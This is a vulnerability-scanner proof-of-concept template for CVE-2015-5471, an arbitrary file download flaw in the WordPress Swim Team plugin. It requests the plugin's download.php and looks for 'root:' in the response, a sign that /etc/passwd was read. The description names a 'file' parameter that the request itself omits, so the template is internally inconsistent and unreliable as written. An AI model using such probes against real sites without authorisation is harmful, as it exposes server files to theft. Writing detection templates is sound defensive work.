[info]
author = "AVE"
description = "检测 WordPress Swim Team 插件 1.44.10777 版本中 /wp-content/plugins/wp-swimteam/include/user/download.php 的任意文件下载漏洞。通过构造 file 参数传入绝对路径，可读取服务器任意文件。"
id = "POC-AVE-2015-0047"
name = "WordPress Swim Team 插件任意文件下载漏洞 PoC"
severity = "medium"
tags = [
    "cve-2015-5471",
    "wordpress",
    "lfi",
    "arbitrary-file-download",
]
vuln_id = [
    "CVE-2015-5471",
    "AVE-2015-0047",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/wp-content/plugins/wp-swimteam/include/user/download.php"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:"]
